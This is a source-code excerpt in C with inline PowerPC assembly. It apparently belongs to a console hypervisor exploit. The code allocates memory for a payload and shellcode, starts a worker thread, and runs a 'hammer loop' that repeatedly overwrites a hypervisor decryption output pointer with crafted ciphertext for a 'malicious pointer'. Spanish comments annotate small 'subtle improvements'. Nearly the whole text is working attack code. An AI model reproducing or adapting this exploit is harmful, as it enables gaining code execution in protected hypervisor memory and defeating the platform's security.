    pUpdateInfo->OutputBufferOffset = PAGE_ALIGN_64K(pUpdateInfo->UpdateDataOffset + pUpdateInfo->UpdateDataSize);
    pUpdateInfo->OutputBufferSize = CACHE_ALIGN(updateDataDecompressedSize);
    pUpdateInfo->ScratchBufferOffset = CACHE_ALIGN(pUpdateInfo->OutputBufferOffset + pUpdateInfo->OutputBufferSize);
    pUpdateInfo->ScratchBufferSize = 0x20000;
    pUpdateInfo->Buffer2Offset = CACHE_ALIGN(pUpdateInfo->ScratchBufferOffset + pUpdateInfo->ScratchBufferSize);
    pUpdateInfo->Buffer2Size = 0x10000;

    // Allocate memory for the XKE payload.
    BYTE* pPayload = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE);
    if (pPayload == NULL)
    {
        DbgPrint("Failed to allocate payload memory\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_1);
        return;
    }

    BYTE* pPayloadClean = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0, PAGE_READWRITE);
    if (pPayloadClean == NULL)
    {
        DbgPrint("Failed to allocate clean payload memory\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_2);
        return;
    }

    memset(pPayload, 0, PayloadDataSize);
    memset(pPayloadClean, 0, PayloadDataSize);

    // Read the payload file.
    if (ReadFile(PAYLOAD_DRIVE "\\xke_update.bin", pPayloadClean, 0, PayloadDataSize) == false)
    {
        DbgPrint("Failed to read XKE payload file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_XKE_PAYLOAD_FILE);
        return;
    }

    // Setup thread args.
    ThreadArgs.UpdateDataPhys = MmGetPhysicalAddress(pUpdateData);
    ThreadArgs.UpdateDataSize = pUpdateInfo->TotalSize;
    ThreadArgs.pPayloadClean = pPayloadClean;
    ThreadArgs.pPayloadBuffer = pPayload;
    ThreadArgs.PayloadPhys = MmGetPhysicalAddress(pPayload);
    ThreadArgs.PayloadSize = PayloadDataSize;
    ThreadArgs.pCompressedDataClean = pCleanUpdateData;
    ThreadArgs.CompressedDataSize = CleanUpdateDataSize;
    ThreadArgs.pCompressedDataInBuffer = pUpdateData + pUpdateInfo->UpdateDataOffset;
    ThreadArgs.pScratchDataInBuffer = pUpdateData + pUpdateInfo->ScratchBufferOffset;
    ThreadArgs.ScratchDataOffset = pUpdateInfo->ScratchBufferOffset;
    ThreadArgs.ScratchDataSize = pUpdateInfo->ScratchBufferSize;

    ThreadArgs.HvCheckAddress = pCipherTextInputData->dec_output_buffer;
    ThreadArgs.ShellCodePhysAddress = ShellCodePhys;

    // Save the scratch pointer, we can't access pUpdateInfo from here on out because it'll be moved to protected memory by the hv.
    BYTE* pScratchPtr = pUpdateData + pUpdateInfo->ScratchBufferOffset;

    ThreadArgs.pScratchBuffer = pScratchPtr;

    // MEJORA SUTIL: Mejor configuración del thread para prioridad
    HANDLE hXKEWorkerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunUpdatePayloadThreadProc, &ThreadArgs, CREATE_SUSPENDED, NULL);
    if (hXKEWorkerThread == NULL)
    {
        DbgPrint("Failed to create worker thread\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CREATING_WORKER_THREAD);
        return;
    }

    // Move the XKE worker to the last physical core.
    XSetThreadProcessor(hXKEWorkerThread, 1);
    
    // MEJORA SUTIL: Pausa para estabilidad antes de iniciar el thread
    KeStallExecutionProcessor(5);
    
    ResumeThread(hXKEWorkerThread);
    
    DbgPrint("Worker thread running, entering hammer loop\n");

hammer_time:

    // Preload valores para el oracle y texto cifrado malicioso usado en el bucle de ataque.
    ULONGLONG ScratchCipherTextValue = *(ULONGLONG*)&pCipherTextInputData->OracleData[0];
    ULONGLONG DecOutputBufferDataVal1 = *(ULONGLONG*)&pCipherTextInputData->DecOutputBufferData[0];
    ULONGLONG DecOutputBufferDataVal2 = *(ULONGLONG*)&pCipherTextInputData->DecOutputBufferData[8];

    // Bucle de hammer optimizado pero sin cambiar la estructura fundamental
    int loopCount = HAMMER_LOOP_COUNT;   // Ajustado ligeramente desde 100000

    _asm
    {
        // Preload registers with all the data we'll need during the attack loop.
        mr      r31, pScratchPtr
        mr      r30, ScratchCipherTextValue
        mr      r29, DecOutputBufferDataVal1
        mr      r28, DecOutputBufferDataVal2
        addi    r26, r31, 0x2B00
        mr      r25, loopCount

loop:
        // Check the cipher text in the scratch buffer and see if it matches the oracle data we computed.
        ld      r11, 0(r31)
        cmpld   cr6, r11, r30
        bne     cr6, flush

            // Cipher text matches the oracle data, begin the attack and hammer the dec_output_buffer pointer
            // with the cipher text for our malicious pointer.
            mtctr   r25

overwrite:
            std     r29, 0x20(r26)
            std     r28, 0x28(r26)
            dcbst   r0, r26
            
            // MEJORA SUTIL: Una instrucción sync para mejor coherencia
            // Esto ayuda a la estabilidad sin alterar el timing fundamental
            sync
            
            bdnz    overwrite

flush:
        // Flush cache
        dcbf    r0, r31
        
        b       loop
        
exit_hammer:
        // Punto de salida cuando el exploit ha tenido éxito
end:
    }

    // Should never make it here.
    DbgBreakPoint();
}